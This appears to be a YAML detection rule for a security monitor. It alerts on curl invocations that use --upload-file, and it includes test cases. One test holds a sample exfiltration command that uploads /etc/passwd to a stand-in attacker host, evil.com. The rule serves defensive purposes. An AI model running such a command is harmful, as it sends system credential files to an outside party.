name: curl_upload_file_regex
mode: alert
eval: |
  (
    e.process_name == "curl" &&
    re_match(e.process_args, "--upload-file\\s+\\S+")
  )
tests:
  - cleartext: "curl https://evil.com --upload-file /etc/passwd"
    process_name: curl
    process_args: "curl https://evil.com --upload-file /etc/passwd"
    should_match: true
  - cleartext: "curl https://example.com"
    process_name: curl
    process_args: "curl https://example.com"
    should_match: false
